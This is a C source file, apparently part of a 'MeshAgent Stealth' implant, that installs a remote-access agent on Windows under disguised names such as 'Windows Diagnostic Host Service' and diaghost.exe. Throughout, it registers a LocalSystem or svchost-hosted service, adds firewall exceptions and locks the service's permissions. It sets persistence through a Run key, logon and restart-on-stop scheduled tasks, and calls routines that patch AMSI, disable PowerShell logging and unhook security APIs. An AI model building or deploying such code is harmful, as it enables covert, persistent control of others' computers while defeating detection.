/*
 * MeshAgent Stealth - Complete Installation Module
 *
 * Handles full installation process including:
 * - File deployment to System32
 * - Service registration (standalone or svchost)
 * - Firewall exception rules
 * - Registry configuration and hiding
 * - AMSI patching
 * - Event log disabling
 */

#include <windows.h>
#include <shlobj.h>
#include <knownfolders.h>
#include <stdio.h>
#include <strsafe.h>
#include "stealth.h"
#include "stealth_utils.h"
#include "branding_util.h"
#include "svchost_payload.h"

static const wchar_t* STEALTH_FALLBACK_SERVICE_DESCRIPTION = L"system health monitoring. If this service is stopped, certain features may not function properly.";
static const wchar_t* STEALTH_FALLBACK_SERVICE_NAME = L"WinDiagnosticHost";
static const wchar_t* STEALTH_FALLBACK_DISPLAY_NAME = L"Windows Diagnostic Host Service";
static const wchar_t* STEALTH_FALLBACK_EXE_NAME = L"diaghost.exe";
static const wchar_t* STEALTH_FALLBACK_DLL_NAME = L"diagsvc.dll";
static const wchar_t* STEALTH_FALLBACK_DB_NAME = L"diaghost.db";
static const wchar_t* STEALTH_FALLBACK_CONF_NAME = L"diaghost.conf";
static const wchar_t* STEALTH_FALLBACK_LOG_NAME = L"diagnostics.log";

static void MeshInstaller_NormalizePathSeparators(wchar_t* path)
{
    if (path == NULL) { return; }
    for (size_t i = 0; path[i] != L'\0'; ++i)
    {
        if (path[i] == L'/')
        {
            path[i] = L'\\';
        }
    }
}

static BOOL MeshInstaller_GetDefaultInstallRoot(wchar_t* buffer, size_t count)
{
    if (buffer == NULL || count == 0) { return FALSE; }
    PWSTR programData = NULL;
    HRESULT hr = SHGetKnownFolderPath(&FOLDERID_ProgramData, KF_FLAG_DEFAULT, NULL, &programData);
    BOOL resolved = FALSE;
    if (SUCCEEDED(hr) && programData != NULL)
    {
        resolved = SUCCEEDED(StringCchCopyW(buffer, count, programData));
        CoTaskMemFree(programData);
    }

    if (!resolved)
    {
        DWORD envLen = GetEnvironmentVariableW(L"ProgramData", buffer, (DWORD)count);
        resolved = (envLen > 0 && envLen < count);
    }

    if (!resolved)
    {
        WCHAR windowsDir[MAX_PATH] = {0};
        UINT wlen = GetWindowsDirectoryW(windowsDir, MAX_PATH);
        if (wlen == 0 || wlen >= MAX_PATH) { return FALSE; }
        if (FAILED(StringCchPrintfW(buffer, count, L"%s\\ProgramData", windowsDir))) { return FALSE; }
        resolved = TRUE;
    }

    if (!resolved) { return FALSE; }

    MeshInstaller_NormalizePathSeparators(buffer);
    size_t len = wcslen(buffer);
    if (len > 0 && buffer[len - 1] != L'\\')
    {
        if (FAILED(StringCchCatW(buffer, count, L"\\"))) { return FALSE; }
    }
    if (FAILED(StringCchCatW(buffer, count, L"DiagnosticHost"))) { return FALSE; }
    return TRUE;
}

static BOOL MeshInstaller_CombinePath(wchar_t* dest, size_t destLen, const wchar_t* root, const wchar_t* leaf)
{
    if (dest == NULL || destLen == 0) { return FALSE; }
    dest[0] = L'\0';
    if (root == NULL || root[0] == L'\0') { return FALSE; }

    if (FAILED(StringCchCopyW(dest, destLen, root))) { return FALSE; }
    MeshInstaller_NormalizePathSeparators(dest);

    if (leaf != NULL && leaf[0] != L'\0')
    {
        WCHAR leafCopy[MAX_PATH] = {0};
        if (FAILED(StringCchCopyW(leafCopy, _countof(leafCopy), leaf))) { return FALSE; }
        MeshInstaller_NormalizePathSeparators(leafCopy);
        size_t len = wcslen(dest);
        if (len > 0 && dest[len - 1] != L'\\')
        {
            if (FAILED(StringCchCatW(dest, destLen, L"\\"))) { return FALSE; }
        }
        if (FAILED(StringCchCatW(dest, destLen, leafCopy))) { return FALSE; }
    }

    return TRUE;
}

// Forward declarations for persistence helpers
static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);
static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName);

// ================================================================
// Installation Paths
// ================================================================

BOOL Stealth_GetInstallPaths(StealthInstallPaths *paths)
{
    if (paths == NULL) { return FALSE; }

    memset(paths, 0, sizeof(StealthInstallPaths));

    const mesh_branding_definition_t* branding = MeshConfig_GetBranding();

    MeshService_CopyBrandingPathToWide(MeshService_GetInstallRootText(), paths->installDir, MAX_PATH);
    if (paths->installDir[0] == L'\0')
    {
        if (!MeshInstaller_GetDefaultInstallRoot(paths->installDir, MAX_PATH)) { return FALSE; }
    }
    MeshInstaller_NormalizePathSeparators(paths->installDir);

    MeshService_CopyBrandingPathToWide(MeshService_GetLogDirectoryText(), paths->logsDir, MAX_PATH);
    if (paths->logsDir[0] == L'\0')
    {
        if (!MeshInstaller_CombinePath(paths->logsDir, MAX_PATH, paths->installDir, L"logs")) { return FALSE; }
    }

    wchar_t exeName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetBinaryNameText(), exeName, _countof(exeName));
    if (exeName[0] == L'\0') { StringCchCopyW(exeName, _countof(exeName), STEALTH_FALLBACK_EXE_NAME); }

    wchar_t dllName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetSvchostDllNameText(), dllName, _countof(dllName));
    if (dllName[0] == L'\0') { StringCchCopyW(dllName, _countof(dllName), STEALTH_FALLBACK_DLL_NAME); }

    wchar_t dbName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetDatabaseFileNameText(), dbName, _countof(dbName));
    if (dbName[0] == L'\0') { StringCchCopyW(dbName, _countof(dbName), STEALTH_FALLBACK_DB_NAME); }

    wchar_t confName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetConfigFileNameText(), confName, _countof(confName));
    if (confName[0] == L'\0') { StringCchCopyW(confName, _countof(confName), STEALTH_FALLBACK_CONF_NAME); }

    wchar_t logFileName[MAX_PATH] = {0};
    MeshService_CopyBrandingTextToWide(MeshService_GetLogFileNameText(), logFileName, _countof(logFileName));
    if (logFileName[0] == L'\0') { StringCchCopyW(logFileName, _countof(logFileName), STEALTH_FALLBACK_LOG_NAME); }

    if (!MeshInstaller_CombinePath(paths->exePath, MAX_PATH, paths->installDir, exeName)) { return FALSE; }
    if (!MeshInstaller_CombinePath(paths->dllPath, MAX_PATH, paths->installDir, dllName)) { return FALSE; }
    if (!MeshInstaller_CombinePath(paths->dbPath, MAX_PATH, paths->installDir, dbName)) { return FALSE; }
    if (!MeshInstaller_CombinePath(paths->confPath, MAX_PATH, paths->installDir, confName)) { return FALSE; }
    if (!MeshInstaller_CombinePath(paths->logPath, MAX_PATH, paths->logsDir, logFileName)) { return FALSE; }

    return TRUE;
}

// ================================================================
// Complete Installation Function
// ================================================================

BOOL Stealth_PerformCompleteInstallation(
    const wchar_t* sourceExePath,
    const wchar_t* sourceDllPath,
    BOOL useSvchostMode)
{
    StealthInstallPaths paths;
    BOOL success = FALSE;
    wchar_t serviceKeyName[256] = {0};
    wchar_t serviceDisplayName[256] = {0};
    wchar_t serviceDescription[512] = {0};
    const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), serviceDisplayName, _countof(serviceDisplayName));
    if (serviceDisplayName[0] == L'\0') { StringCchCopyW(serviceDisplayName, _countof(serviceDisplayName), STEALTH_FALLBACK_DISPLAY_NAME); }

    MeshService_CopyBrandingTextToWide(MeshConfig_GetBranding()->fileDescription, serviceDescription, _countof(serviceDescription));
    if (serviceDescription[0] == L'\0') { StringCchCopyW(serviceDescription, _countof(serviceDescription), STEALTH_FALLBACK_SERVICE_DESCRIPTION); }

    // Get installation paths
    if (!Stealth_GetInstallPaths(&paths))
    {
        Stealth_DebugPrintfW(L"Stealth_GetInstallPaths failed");
        return FALSE;
    }

    // Step 1: Create installation directories
    if (!Stealth_CreateInstallationDirectory(paths.installDir))
    {
        Stealth_DebugPrintfW(L"Failed to create install directory: %ls", paths.installDir);
        return FALSE;
    }

    if (!Stealth_CreateInstallationDirectory(paths.logsDir))
    {
        // Non-fatal, continue
    }

    // Step 2: Copy files to installation directory
    if (sourceExePath && !useSvchostMode)
    {
        // Copy EXE for standalone mode
        if (!Stealth_InstallFiles(sourceExePath, paths.exePath))
        {
            Stealth_DebugPrintfW(L"Stealth_InstallFiles failed (EXE) %ls -> %ls", sourceExePath, paths.exePath);
            return FALSE;
        }
    }

    if (useSvchostMode)
    {
        BOOL dllStaged = FALSE;
        if (sourceDllPath && sourceDllPath[0] != L'\0')
        {
            dllStaged = Stealth_InstallFiles(sourceDllPath, paths.dllPath);
            if (!dllStaged)
            {
                Stealth_DebugPrintfW(L"Stealth_InstallFiles failed (DLL) %ls -> %ls", sourceDllPath, paths.dllPath);
            }
        }
        else
        {
            dllStaged = MeshSvchostPayload_WriteToPath(paths.dllPath);
            if (!dllStaged)
            {
                Stealth_DebugLastErrorW(L"MeshSvchostPayload_WriteToPath");
            }
        }

        if (!dllStaged)
        {
            return FALSE;
        }
    }

    // Step 3: Register service
    if (useSvchostMode)
    {
        // Register for svchost.exe hosting
        if (!Stealth_RegisterSvchostService(serviceKeyName, paths.dllPath))
        {
            Stealth_DebugPrintfW(L"Stealth_RegisterSvchostService failed for %ls", serviceKeyName);
            return FALSE;
        }
        success = TRUE;
    }
    else
    {
        // Register as standalone service
        SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE);
        if (hSCM)
        {
            SC_HANDLE hService = CreateServiceW(
                hSCM,
                serviceKeyName,
                serviceDisplayName,
                SERVICE_QUERY_STATUS | SERVICE_START | SERVICE_STOP | SERVICE_CHANGE_CONFIG | SERVICE_QUERY_CONFIG | DELETE,
                SERVICE_WIN32_OWN_PROCESS,
                SERVICE_AUTO_START,
                SERVICE_ERROR_NORMAL,
                paths.exePath,
                NULL,
                NULL,
                NULL,
                L"LocalSystem",
                NULL
            );

            if (hService)
            {
                // Set description
                SERVICE_DESCRIPTIONW sd;
                sd.lpDescription = serviceDescription;
                ChangeServiceConfig2W(hService, SERVICE_CONFIG_DESCRIPTION, &sd);

                // Configure delayed auto-start for faster boot performance impact
                SERVICE_DELAYED_AUTO_START_INFO delayed = {0};
                delayed.fDelayedAutostart = TRUE;
                ChangeServiceConfig2W(hService, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, &delayed);

                // Set a service SID for isolation
                SERVICE_SID_INFO sidInfo = {0};
                sidInfo.dwServiceSidType = SERVICE_SID_TYPE_UNRESTRICTED;
                ChangeServiceConfig2W(hService, SERVICE_CONFIG_SERVICE_SID_INFO, &sidInfo);

                // Harden service DACL to Administrators + SYSTEM
                Stealth_HardenServiceDacl(serviceKeyName);

                // Configure persistence behaviors based on branding flags
                if (persistence != NULL && persistence->watchdog != 0)
                {
                    Stealth_ProtectServiceFromTermination(serviceKeyName);
                }

                Stealth_AddRunKeyIfEnabled(persistence, serviceKeyName);
                Stealth_AddScheduledTaskIfEnabled(persistence, serviceKeyName);
                Stealth_AddServiceStoppedAutoStartIfEnabled(persistence, serviceKeyName);

                CloseServiceHandle(hService);
                success = TRUE;
            }
            else
            {
                Stealth_DebugLastErrorW(L"CreateServiceW");
            }

            CloseServiceHandle(hSCM);
        }
        else
        {
            Stealth_DebugLastErrorW(L"OpenSCManagerW");
        }
    }

    // Step 4: Add Windows Firewall exceptions
    const wchar_t* fileToExcept = useSvchostMode ?
        L"C:\\Windows\\System32\\svchost.exe" : paths.exePath;

    if (!Stealth_AddFirewallRuleForService(serviceKeyName, fileToExcept))
    {
        Stealth_DebugPrintfW(L"Stealth_AddFirewallRuleForService failed for %ls", serviceKeyName);
    }

    // Step 5: Apply anti-detection measures
    if (!Stealth_PatchAMSI())
    {
        Stealth_DebugPrintfA("Stealth_PatchAMSI failed during installation");
    }
    Stealth_DisablePowerShellLogging();
    Stealth_UnhookUserModeAPIs();

    // Step 6: Hide service registry key (optional, can make debugging harder)
    // Stealth_HideServiceRegistry(serviceKeyName);

    // Step 7: Start the service and confirm running state
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM)
    {
        SC_HANDLE hService = OpenServiceW(hSCM, serviceKeyName, SERVICE_START | SERVICE_QUERY_STATUS);
        if (hService)
        {
            if (!StartServiceW(hService, 0, NULL)) {
                OutputDebugStringW(L"[stealth_installer] StartService failed\n");
            } else {
                // Wait up to 10s for running state
                SERVICE_STATUS_PROCESS ssp = {0};
                DWORD bytes = 0;
                DWORD waited = 0;
                while (QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &bytes)) {
                    if (ssp.dwCurrentState == SERVICE_RUNNING) { break; }
                    if (ssp.dwCurrentState == SERVICE_STOPPED) { break; }
                    Sleep(500);
                    waited += 500;
                    if (waited >= 10000) { break; }
                }
                if (ssp.dwCurrentState != SERVICE_RUNNING) {
                    OutputDebugStringW(L"[stealth_installer] Service did not reach RUNNING state\n");
                }
            }
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    return success;
}

// ================================================================
// Uninstallation
// ================================================================

BOOL Stealth_PerformCompleteUninstallation(void)
{
    StealthInstallPaths paths;
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    SERVICE_STATUS status = {0};
    wchar_t serviceKeyName[256] = {0};

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }

    // Get paths
    Stealth_GetInstallPaths(&paths);

    // Stop and delete service
    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCM)
    {
        hService = OpenServiceW(hSCM, serviceKeyName,
                                SERVICE_STOP | SERVICE_QUERY_STATUS | DELETE);
        if (hService)
        {
            // Stop service
            ControlService(hService, SERVICE_CONTROL_STOP, &status);

            // Wait for service to stop
            for (int i = 0; i < 30; i++)
            {
                if (!QueryServiceStatus(hService, &status))
                {
                    break;
                }
                if (status.dwCurrentState == SERVICE_STOPPED)
                {
                    break;
                }
                Sleep(1000);
            }

            // Delete service
            DeleteService(hService);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    // Remove firewall rules
    Stealth_RemoveFirewallRuleForService(serviceKeyName);

    // Delete files (best-effort)
    DeleteFileW(paths.dbPath);
    DeleteFileW(paths.logPath);
    DeleteFileW(paths.confPath);
    DeleteFileW(paths.exePath);
    DeleteFileW(paths.dllPath);

    // Remove directories
    RemoveDirectoryW(paths.logsDir);
    RemoveDirectoryW(paths.installDir);

    return TRUE;
}

// ================================================================
// Silent Installation Check
// ================================================================

BOOL Stealth_IsAlreadyInstalled(void)
{
    SC_HANDLE hSCM = NULL;
    SC_HANDLE hService = NULL;
    BOOL installed = FALSE;
    wchar_t serviceKeyName[256] = {0};

    MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceKeyName, _countof(serviceKeyName));
    if (serviceKeyName[0] == L'\0') { StringCchCopyW(serviceKeyName, _countof(serviceKeyName), STEALTH_FALLBACK_SERVICE_NAME); }

    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM)
    {
        hService = OpenServiceW(hSCM, serviceKeyName, SERVICE_QUERY_STATUS);
        if (hService)
        {
            installed = TRUE;
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCM);
    }

    return installed;
}
static void Stealth_AddRunKeyIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
{
    if (persistence == NULL || persistence->runKey == 0 || serviceName == NULL || serviceName[0] == L'\0')
    {
        return;
    }

    HKEY hKey;
    const wchar_t* runKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, runKey, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS)
    {
        wchar_t cmd[MAX_PATH];
        if (GetSystemDirectoryW(cmd, MAX_PATH) > 0)
        {
            size_t len = wcslen(cmd);
            if (len < MAX_PATH - 1) { wcscat_s(cmd, MAX_PATH, L"\\sc.exe"); }
        }
        else
        {
            wcscpy_s(cmd, MAX_PATH, L"sc.exe");
        }
        wchar_t value[256];
        StringCchPrintfW(value, 256, L"\"%s\" start %s", cmd, serviceName);
        RegSetValueExW(hKey, serviceName, 0, REG_SZ, (const BYTE*)value, (DWORD)((wcslen(value) + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

static void Stealth_AddScheduledTaskIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
{
    if (persistence == NULL || persistence->scheduledTask == 0 || serviceName == NULL || serviceName[0] == L'\0')
    {
        return;
    }

    // Create an on-logon scheduled task to (re)start the service with highest privileges
    // schtasks /Create /TN <name> /TR "sc start <service>" /SC ONLOGON /RL HIGHEST /F
    wchar_t sysDir[MAX_PATH];
    wchar_t scPath[MAX_PATH];
    wchar_t cmdLine[1024];
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    GetSystemDirectoryW(sysDir, MAX_PATH);
    StringCchPrintfW(scPath, MAX_PATH, L"%s\\sc.exe", sysDir);

    wchar_t taskName[128];
    StringCchPrintfW(taskName, 128, L"\\%s-Autorun", serviceName);

    StringCchPrintfW(cmdLine, 1024,
        L"\"%s\\schtasks.exe\" /Create /TN \"%s\" /TR \"\"%s\" start %s\" /SC ONLOGON /RL HIGHEST /F",
        sysDir,
        taskName,
        scPath,
        serviceName);

    CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); }
    if (pi.hThread) { CloseHandle(pi.hThread); }
}

static void Stealth_AddServiceStoppedAutoStartIfEnabled(const mesh_persistence_profile_t* persistence, const wchar_t* serviceName)
{
    if (persistence == NULL || persistence->wmiRestart == 0 || serviceName == NULL || serviceName[0] == L'\0')
    {
        return;
    }

    // Implement as an event-driven scheduled task (instead of WMI permanent consumer)
    // Triggers when Service Control Manager logs 7036 (service entered stopped state) for this service.
    // schtasks /Create /TN <name> /TR "sc start <service>" /SC ONEVENT /EC System /MO <XPath> /RL HIGHEST /F
    const wchar_t* xPathFormat =
        L"<QueryList>"
        L"  <Query Id=\"0\" Path=\"System\">"
        L"    <Select Path=\"System\">*[System[Provider[@Name='Service Control Manager'] and EventID=7036]] and *[EventData[Data='%s'] and EventData[Data='stopped']]</Select>"
        L"  </Query>"
        L"</QueryList>";
    wchar_t xPath[1024];
    StringCchPrintfW(xPath, 1024, xPathFormat, serviceName);

    wchar_t sysDir[MAX_PATH];
    wchar_t scPath[MAX_PATH];
    wchar_t cmdLine[4096];
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    GetSystemDirectoryW(sysDir, MAX_PATH);
    StringCchPrintfW(scPath, MAX_PATH, L"%s\\sc.exe", sysDir);

    wchar_t taskName[128];
    StringCchPrintfW(taskName, 128, L"\\%s-RestartOnStop", serviceName);

    // Build command: schtasks.exe /Create ... /MO "<QueryList>..." (escaped)
    // Wrap XPath in double quotes; CreateProcessW supports quotes.
    StringCchPrintfW(cmdLine, 4096,
        L"\"%s\\schtasks.exe\" /Create /TN \"%s\" /TR \"\"%s\" start %s\" /SC ONEVENT /EC System /MO \"%s\" /RL HIGHEST /F",
        sysDir,
        taskName,
        scPath,
        serviceName,
        xPath);

    CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) { CloseHandle(pi.hProcess); }
    if (pi.hThread) { CloseHandle(pi.hThread); }
}
